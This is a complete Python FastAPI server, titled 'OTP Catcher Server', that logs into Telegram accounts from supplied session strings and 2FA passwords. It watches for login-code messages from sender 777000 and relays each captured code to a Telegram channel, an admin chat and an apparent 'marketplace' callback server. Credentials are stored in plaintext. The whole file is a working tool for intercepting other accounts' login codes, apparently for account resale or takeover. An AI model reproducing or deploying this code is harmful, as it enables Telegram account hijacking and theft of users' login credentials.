import asyncio
import logging
import re
import time
import uuid
from datetime import datetime, timedelta
from typing import Dict, Optional, List, Any
from contextlib import asynccontextmanager

# FastAPI imports
from fastapi import FastAPI, HTTPException, Header, Depends, BackgroundTasks
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
import uvicorn

# Telegram imports
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    FloodWait,
    SessionExpired,
    UserDeactivated,
    UserDeactivatedBan,
    AuthKeyUnregistered
)

# HTTP client for callbacks
import httpx

# Database
import asyncpg
from asyncpg.pool import Pool

# Configuration
import os
from dotenv import load_dotenv

load_dotenv()

# ==================== CONFIGURATION ====================

class Config:
    # Telegram API credentials
    TELEGRAM_API_ID = int(os.getenv("TELEGRAM_API_ID", "123456"))
    TELEGRAM_API_HASH = os.getenv("TELEGRAM_API_HASH", "your_api_hash")
    
    # Security
    INTERNAL_API_KEY = os.getenv("INTERNAL_API_KEY", "shared-secret-key")
    
    # Main server callback URL
    MAIN_SERVER_CALLBACK_URL = os.getenv(
        "MAIN_SERVER_CALLBACK_URL",
        "https://marketplace-server.onrender.com/api/otp/callback"
    )
    
    # Database
    DATABASE_URL = os.getenv(
        "DATABASE_URL",
        "postgresql://user:password@localhost:5432/otp_db"
    )
    
    # Server settings
    MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", "10"))
    OTP_TIMEOUT = int(os.getenv("OTP_TIMEOUT", "300"))  # 5 minutes
    HOST = os.getenv("HOST", "0.0.0.0")
    PORT = int(os.getenv("PORT", "8000"))
    
    # Telegram OTP sender ID
    OTP_SENDER_ID = 777000

# ==================== LOGGING ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== DATA MODELS ====================

class EndpointConfig(BaseModel):
    bot_token: str
    admin_telegram_id: int
    channel_username: str

class RegisterRequest(BaseModel):
    phone_number: str
    session_string: str
    two_fa_password: Optional[str] = None
    callback_url: Optional[str] = None
    transaction_id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    purchase_code: Optional[str] = None
    endpoint_config: Optional[EndpointConfig] = None

class VerifyRequest(BaseModel):
    phone_number: str
    otp_code: str
    transaction_id: Optional[str] = None

class OTPCallback(BaseModel):
    phone_number: str
    otp_code: Optional[str] = None
    status: str
    transaction_id: str
    purchase_code: Optional[str] = None
    timestamp: str = Field(default_factory=lambda: datetime.now().isoformat())

# ==================== DATABASE MANAGER ====================

class DatabaseManager:
    def __init__(self):
        self.pool: Optional[Pool] = None
    
    async def initialize(self):
        """Initialize database pool and create tables"""
        try:
            self.pool = await asyncpg.create_pool(
                Config.DATABASE_URL,
                min_size=1,
                max_size=10
            )
            
            # Create tables
            await self.create_tables()
            logger.info("Database initialized successfully")
            
        except Exception as e:
            logger.error(f"Database initialization error: {str(e)}")
            # Don't fail if database is not available
            self.pool = None
    
    async def create_tables(self):
        """Create necessary database tables"""
        if not self.pool:
            return
        
        create_table_query = """
        CREATE TABLE IF NOT EXISTS otp_requests (
            id SERIAL PRIMARY KEY,
            transaction_id VARCHAR(50) UNIQUE NOT NULL,
            purchase_code VARCHAR(50),
            phone_number VARCHAR(20) NOT NULL,
            session_string TEXT NOT NULL,
            two_fa_password TEXT,
            bot_token VARCHAR(255),
            admin_telegram_id BIGINT,
            channel_username VARCHAR(255),
            callback_url TEXT,
            status VARCHAR(20) DEFAULT 'active',
            otp_code TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            detected_at TIMESTAMP,
            timeout_at TIMESTAMP
        );
        """
        
        try:
            async with self.pool.acquire() as conn:
                await conn.execute(create_table_query)
                logger.info("Database tables created/verified")
        except Exception as e:
            logger.error(f"Table creation error: {str(e)}")
    
    async def save_request(self, request_data: dict):
        """Save OTP request to database"""
        if not self.pool:
            return
        
        query = """
        INSERT INTO otp_requests (
            transaction_id, purchase_code, phone_number, session_string,
            two_fa_password, bot_token, admin_telegram_id, channel_username,
            callback_url, status, timeout_at
        ) VALUES (
            $1, $2, $3, $4, $5, $6, $7, $8, $9, 'active',
            NOW() + INTERVAL '5 minutes'
        )
        """
        
        try:
            async with self.pool.acquire() as conn:
                await conn.execute(
                    query,
                    request_data.get('transaction_id'),
                    request_data.get('purchase_code'),
                    request_data.get('phone_number'),
                    request_data.get('session_string'),
                    request_data.get('two_fa_password'),
                    request_data.get('bot_token'),
                    request_data.get('admin_telegram_id'),
                    request_data.get('channel_username'),
                    request_data.get('callback_url')
                )
        except Exception as e:
            logger.error(f"Database save error: {str(e)}")
    
    async def update_status(self, transaction_id: str, status: str, otp_code: Optional[str] = None):
        """Update OTP request status in database"""
        if not self.pool:
            return
        
        query = """
        UPDATE otp_requests 
        SET status = $1, 
            otp_code = COALESCE($2, otp_code),
            detected_at = CASE WHEN $1 = 'detected' THEN NOW() ELSE detected_at END
        WHERE transaction_id = $3
        """
        
        try:
            async with self.pool.acquire() as conn:
                await conn.execute(query, status, otp_code, transaction_id)
        except Exception as e:
            logger.error(f"Database update error: {str(e)}")
    
    async def get_request(self, transaction_id: str) -> Optional[dict]:
        """Get OTP request from database"""
        if not self.pool:
            return None
        
        query = "SELECT * FROM otp_requests WHERE transaction_id = $1"
        
        try:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(query, transaction_id)
                return dict(row) if row else None
        except Exception as e:
            logger.error(f"Database query error: {str(e)}")
            return None

# ==================== CHANNEL POSTER ====================

class ChannelPoster:
    def __init__(self):
        self.bot_clients: Dict[str, Client] = {}
    
    async def post_otp_to_channel(self, bot_token: str, channel_username: str, 
                                  admin_telegram_id: int, phone_number: str, 
                                  otp_code: str, country_name: str = "Unknown",
                                  transaction_id: str = "", purchase_code: str = ""):
        """Post OTP to Telegram channel with detailed template"""
        try:
            # Create bot client if not exists
            bot_key = f"{bot_token}_{channel_username}"
            if bot_key not in self.bot_clients:
                bot_client = Client(
                    name=f"bot_{bot_key[:20]}",
                    bot_token=bot_token,
                    in_memory=True
                )
                await bot_client.start()
                self.bot_clients[bot_key] = bot_client
            else:
                bot_client = self.bot_clients[bot_key]
            
            # Format phone number (hide middle digits)
            hidden_phone = self._mask_phone(phone_number)
            
            # Current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            date_only = datetime.now().strftime("%Y-%m-%d")
            time_only = datetime.now().strftime("%H:%M:%S")
            
            # Generate unique reference ID
            reference_id = f"OTP-{datetime.now().strftime('%Y%m%d')}-{uuid.uuid4().hex[:8].upper()}"
            
            # Channel message with detailed template
            channel_message = f"""
🎯 <b>OTP CODE DETECTED!</b>
━━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone Number:</b>
<code>{hidden_phone}</code>

🔐 <b>OTP Code:</b>
<code>{otp_code}</code>

🌍 <b>Country:</b> {country_name}

📅 <b>Date:</b> {date_only}
🕐 <b>Time:</b> {time_only}

📋 <b>Reference ID:</b>
<code>{reference_id}</code>

━━━━━━━━━━━━━━━━━━━━━━
✅ <b>Status:</b> Auto-detected
⚡ <b>Source:</b> Telegram Official
🤖 <b>System:</b> OTP Catcher v2.0
━━━━━━━━━━━━━━━━━━━━━━

🔒 <i>This is an automated message</i>
📡 <i>Monitoring Telegram Sender: 777000</i>
"""
            
            # Send to channel
            await bot_client.send_message(
                channel_username,
                channel_message,
                parse_mode="HTML"
            )
            
            # Admin message with full details
            admin_message = f"""
🔔 <b>OTP DETECTED - ADMIN ALERT</b>
━━━━━━━━━━━━━━━━━━━━━━

📱 <b>Full Phone Number:</b>
<code>{phone_number}</code>

🔐 <b>OTP Code:</b>
<code>{otp_code}</code>

🌍 <b>Country:</b> {country_name}

📅 <b>Date:</b> {date_only}
🕐 <b>Time:</b> {time_only}

📋 <b>Transaction ID:</b>
<code>{transaction_id}</code>

🎫 <b>Purchase Code:</b>
<code>{purchase_code}</code>

📇 <b>Reference ID:</b>
<code>{reference_id}</code>

━━━━━━━━━━━━━━━━━━━━━━
✅ <b>Status:</b> Successfully Detected
⚡ <b>Detection Time:</b> Instant
🔒 <b>Security:</b> Encrypted Connection
━━━━━━━━━━━━━━━━━━━━━━

<i>This is an admin-only message with full details</i>
"""
            
            # Send to admin
            try:
                await bot_client.send_message(
                    admin_telegram_id,
                    admin_message,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"Admin message error: {str(e)}")
            
            logger.info(f"OTP posted to channel for {hidden_phone}")
            
        except Exception as e:
            logger.error(f"Channel posting error: {str(e)}")
    
    def _mask_phone(self, phone: str) -> str:
        """Mask middle digits of phone number"""
        if len(phone) <= 4:
            return phone
        
        # Keep first 3 and last 2 digits
        return f"{phone[:3]}*****{phone[-2:]}"

# ==================== OTP MONITOR MANAGER ====================

class OTPMonitor:
    def __init__(self):
        self.active_sessions: Dict[str, dict] = {}
        self.otp_requests: Dict[str, dict] = {}
        self.semaphore = asyncio.Semaphore(Config.MAX_CONCURRENT)
        self.telegram_clients: Dict[str, Client] = {}
        self.db_manager = DatabaseManager()
        self.channel_poster = ChannelPoster()
        
    async def initialize(self):
        """Initialize database"""
        await self.db_manager.initialize()
    
    async def register_account(self, request: RegisterRequest) -> dict:
        """Register a new account for OTP monitoring"""
        async with self.semaphore:
            try:
                # Create client from session string
                client = Client(
                    name=f"session_{request.phone_number}_{int(time.time())}",
                    api_id=Config.TELEGRAM_API_ID,
                    api_hash=Config.TELEGRAM_API_HASH,
                    session_string=request.session_string,
                    in_memory=True
                )
                
                # Connect to Telegram
                await client.start()
                
                # Handle 2FA if needed
                if request.two_fa_password:
                    try:
                        await client.check_password(request.two_fa_password)
                    except Exception as e:
                        await client.stop()
                        raise HTTPException(400, f"2FA password incorrect: {str(e)}")
                
                # Store client and session info
                session_id = str(uuid.uuid4())
                self.telegram_clients[session_id] = client
                
                # Register OTP handler - ONLY from sender 777000
                @client.on_message(filters.user(Config.OTP_SENDER_ID) & filters.private)
                async def otp_handler(client: Client, message: Message):
                    await self._handle_otp_message(session_id, message)
                
                # Also handle disconnect/expiry
                @client.on_disconnect()
                async def disconnect_handler(client: Client):
                    await self._handle_disconnect(session_id)
                
                session_info = {
                    "session_id": session_id,
                    "phone_number": request.phone_number,
                    "client": client,
                    "registered_at": datetime.now(),
                    "callback_url": request.callback_url or Config.MAIN_SERVER_CALLBACK_URL,
                    "transaction_id": request.transaction_id,
                    "purchase_code": request.purchase_code,
                    "endpoint_config": request.endpoint_config.dict() if request.endpoint_config else None,
                    "status": "active",
                    "otp_received": None
                }
                
                self.active_sessions[session_id] = session_info
                self.otp_requests[request.transaction_id] = session_info
                
                # Save to database
                await self.db_manager.save_request({
                    "transaction_id": request.transaction_id,
                    "purchase_code": request.purchase_code,
                    "phone_number": request.phone_number,
                    "session_string": request.session_string,
                    "two_fa_password": request.two_fa_password,
                    "bot_token": request.endpoint_config.bot_token if request.endpoint_config else None,
                    "admin_telegram_id": request.endpoint_config.admin_telegram_id if request.endpoint_config else None,
                    "channel_username": request.endpoint_config.channel_username if request.endpoint_config else None,
                    "callback_url": request.callback_url or Config.MAIN_SERVER_CALLBACK_URL
                })
                
                # Schedule timeout
                asyncio.create_task(self._schedule_timeout(session_id))
                
                return {
                    "success": True,
                    "session_id": session_id,
                    "message": "Account registered for OTP monitoring",
                    "timeout_at": (datetime.now() + timedelta(seconds=Config.OTP_TIMEOUT)).isoformat()
                }
                
            except HTTPException:
                raise
            except Exception as e:
                logger.error(f"Registration error: {str(e)}")
                raise HTTPException(500, f"Failed to register: {str(e)}")
    
    async def _handle_otp_message(self, session_id: str, message: Message):
        """Handle OTP message from sender 777000"""
        session_info = self.active_sessions.get(session_id)
        if not session_info:
            return
        
        try:
            # Extract text from message
            text = message.text or message.caption or ""
            logger.info(f"Message from 777000 for {session_info['phone_number']}: {text[:50]}...")
            
            # Detect OTP pattern (5-6 digits, Telegram standard)
            otp_patterns = [
                r'Your login code is (\d{5,6})',
                r'Login code: (\d{5,6})',
                r'code[:\s]*(\d{5,6})',
                r'\b(\d{5,6})\b'
            ]
            
            detected_otp = None
            for pattern in otp_patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    detected_otp = match.group(1) if match.groups() else match.group(0)
                    if detected_otp and len(detected_otp) >= 5:
                        break
            
            if detected_otp:
                logger.info(f"OTP detected for {session_info['phone_number']}: {detected_otp}")
                
                # Update session info
                session_info["otp_received"] = detected_otp
                session_info["status"] = "otp_detected"
                session_info["detected_at"] = datetime.now()
                
                # Update database
                await self.db_manager.update_status(
                    session_info["transaction_id"],
                    "detected",
                    detected_otp
                )
                
                # Post to channel if endpoint config exists
                if session_info.get("endpoint_config"):
                    endpoint = session_info["endpoint_config"]
                    await self.channel_poster.post_otp_to_channel(
                        bot_token=endpoint.get("bot_token"),
                        channel_username=endpoint.get("channel_username"),
                        admin_telegram_id=endpoint.get("admin_telegram_id"),
                        phone_number=session_info["phone_number"],
                        otp_code=detected_otp,
                        transaction_id=session_info["transaction_id"],
                        purchase_code=session_info.get("purchase_code", "")
                    )
                
                # Send callback to main server
                await self._send_callback(session_info, detected_otp)
                
                # Remove from active monitoring
                await self._cleanup_session(session_id)
                
        except Exception as e:
            logger.error(f"OTP message handling error: {str(e)}")
    
    async def _handle_disconnect(self, session_id: str):
        """Handle client disconnect"""
        session_info = self.active_sessions.get(session_id)
        if session_info and session_info["status"] == "active":
            logger.warning(f"Session disconnected for {session_info['phone_number']}")
            
            # Update database
            await self.db_manager.update_status(
                session_info["transaction_id"],
                "unauthorized"
            )
            
            # Send unauthorized callback
            callback_data = OTPCallback(
                phone_number=session_info["phone_number"],
                status="unauthorized",
                transaction_id=session_info["transaction_id"],
                purchase_code=session_info.get("purchase_code")
            )
            
            await self._send_callback(session_info, None, "unauthorized")
            await self._cleanup_session(session_id)
    
    async def _send_callback(self, session_info: dict, otp_code: Optional[str] = None, 
                            status: str = "detected"):
        """Send callback to main server"""
        callback_data = OTPCallback(
            phone_number=session_info["phone_number"],
            otp_code=otp_code,
            status=status,
            transaction_id=session_info["transaction_id"],
            purchase_code=session_info.get("purchase_code")
        )
        
        try:
            async with httpx.AsyncClient() as client:
                response = await client.post(
                    session_info["callback_url"],
                    json=callback_data.dict(),
                    headers={
                        "X-Internal-Key": Config.INTERNAL_API_KEY,
                        "Content-Type": "application/json"
                    },
                    timeout=10
                )
                
                if response.status_code == 200:
                    logger.info(f"Callback sent successfully for {session_info['phone_number']}")
                else:
                    logger.error(f"Callback failed with status {response.status_code}")
                    
        except Exception as e:
            logger.error(f"Callback error: {str(e)}")
    
    async def _schedule_timeout(self, session_id: str):
        """Schedule timeout for OTP monitoring"""
        await asyncio.sleep(Config.OTP_TIMEOUT)
        
        session_info = self.active_sessions.get(session_id)
        if session_info and session_info["status"] == "active":
            logger.info(f"Timeout for {session_info['phone_number']}")
            session_info["status"] = "timeout"
            
            # Update database
            await self.db_manager.update_status(
                session_info["transaction_id"],
                "timeout"
            )
            
            # Send timeout callback
            await self._send_callback(session_info, None, "timeout")
            
            await self._cleanup_session(session_id)
    
    async def _cleanup_session(self, session_id: str):
        """Clean up session and stop client"""
        session_info = self.active_sessions.pop(session_id, None)
        if session_info:
            client = session_info["client"]
            try:
                await client.stop()
            except Exception as e:
                logger.error(f"Client stop error: {str(e)}")
            
            # Remove from telegram clients
            self.telegram_clients.pop(session_id, None)
            
            # Remove from otp requests
            transaction_id = session_info["transaction_id"]
            self.otp_requests.pop(transaction_id, None)
    
    async def verify_otp(self, request: VerifyRequest) -> dict:
        """Verify OTP code"""
        # Find active session for this phone number
        for session_id, session_info in self.active_sessions.items():
            if session_info["phone_number"] == request.phone_number:
                if session_info.get("otp_received") == request.otp_code:
                    return {
                        "success": True,
                        "message": "OTP verified successfully"
                    }
                else:
                    return {
                        "success": False,
                        "message": "OTP does not match"
                    }
        
        return {
            "success": False,
            "message": "No active session found for this phone number"
        }
    
    def get_available_slots(self) -> int:
        """Get number of available slots"""
        active_count = len([s for s in self.active_sessions.values() if s["status"] == "active"])
        return max(0, Config.MAX_CONCURRENT - active_count)
    
    def get_active_sessions(self) -> List[dict]:
        """Get list of active sessions"""
        sessions = []
        for session_info in self.active_sessions.values():
            sessions.append({
                "phone_number": session_info["phone_number"],
                "status": session_info["status"],
                "registered_at": session_info["registered_at"].isoformat(),
                "transaction_id": session_info["transaction_id"],
                "purchase_code": session_info.get("purchase_code")
            })
        return sessions

# ==================== FASTAPI APP ====================

otp_monitor = OTPMonitor()

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    logger.info("OTP Catcher Server started")
    logger.info(f"Max concurrent sessions: {Config.MAX_CONCURRENT}")
    logger.info(f"OTP timeout: {Config.OTP_TIMEOUT} seconds")
    logger.info(f"Monitoring sender ID: {Config.OTP_SENDER_ID}")
    
    # Initialize database
    await otp_monitor.initialize()
    
    yield
    
    # Shutdown
    logger.info("Shutting down OTP Catcher Server")
    # Clean up all sessions
    for session_id in list(otp_monitor.active_sessions.keys()):
        await otp_monitor._cleanup_session(session_id)

app = FastAPI(
    title="OTP Catcher Server",
    description="Server for catching OTP codes from Telegram (Sender ID: 777000)",
    version="2.0.0",
    lifespan=lifespan
)

# ==================== AUTH DEPENDENCY ====================

async def verify_api_key(x_internal_key: str = Header(default="")):
    """Verify internal API key"""
    if x_internal_key != Config.INTERNAL_API_KEY:
        raise HTTPException(401, "Invalid API key")
    return True

# ==================== API ENDPOINTS ====================

@app.get("/")
async def root():
    """Root endpoint"""
    return {
        "service": "OTP Catcher Server",
        "status": "running",
        "version": "2.0.0",
        "timestamp": datetime.now().isoformat(),
        "monitoring": f"Sender ID {Config.OTP_SENDER_ID}"
    }

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "available_slots": otp_monitor.get_available_slots(),
        "max_concurrent": Config.MAX_CONCURRENT,
        "active_sessions": len(otp_monitor.active_sessions),
        "otp_timeout": Config.OTP_TIMEOUT,
        "monitoring_sender": Config.OTP_SENDER_ID,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/api/otp/register")
async def register_account(
    request: RegisterRequest,
    background_tasks: BackgroundTasks,
    _: bool = Depends(verify_api_key)
):
    """Register account for OTP monitoring"""
    try:
        # Check available slots
        if otp_monitor.get_available_slots() <= 0:
            raise HTTPException(429, "No available slots. Try again later.")
        
        # Register account
        result = await otp_monitor.register_account(request)
        return result
        
    except HTTPException as e:
        raise e
    except Exception as e:
        logger.error(f"Registration error: {str(e)}")
        raise HTTPException(500, f"Failed to register account: {str(e)}")

@app.post("/api/otp/verify")
async def verify_otp(
    request: VerifyRequest,
    _: bool = Depends(verify_api_key)
):
    """Verify OTP code"""
    try:
        result = await otp_monitor.verify_otp(request)
        return result
    except Exception as e:
        logger.error(f"Verification error: {str(e)}")
        raise HTTPException(500, f"Failed to verify OTP: {str(e)}")

@app.get("/api/otp/sessions")
async def get_sessions(_: bool = Depends(verify_api_key)):
    """Get all active sessions"""
    return {
        "sessions": otp_monitor.get_active_sessions(),
        "total": len(otp_monitor.active_sessions),
        "available_slots": otp_monitor.get_available_slots()
    }

@app.delete("/api/otp/session/{transaction_id}")
async def cancel_session(
    transaction_id: str,
    _: bool = Depends(verify_api_key)
):
    """Cancel an active session"""
    session_info = otp_monitor.otp_requests.get(transaction_id)
    if session_info:
        session_id = session_info["session_id"]
        await otp_monitor._cleanup_session(session_id)
        
        # Update database
        await otp_monitor.db_manager.update_status(transaction_id, "cancelled")
        
        return {"success": True, "message": "Session cancelled"}
    else:
        raise HTTPException(404, "Session not found")

# ==================== ERROR HANDLERS ====================

@app.exception_handler(HTTPException)
async def http_exception_handler(request, exc):
    return JSONResponse(
        status_code=exc.status_code,
        content={"success": False, "error": exc.detail}
    )

@app.exception_handler(Exception)
async def general_exception_handler(request, exc):
    logger.error(f"Unhandled exception: {str(exc)}")
    return JSONResponse(
        status_code=500,
        content={"success": False, "error": "Internal server error"}
    )

# ==================== MAIN ====================

if __name__ == "__main__":
    uvicorn.run(
        "otp_server:app",
        host=Config.HOST,
        port=Config.PORT,
        reload=False,
        log_level="info"
    )
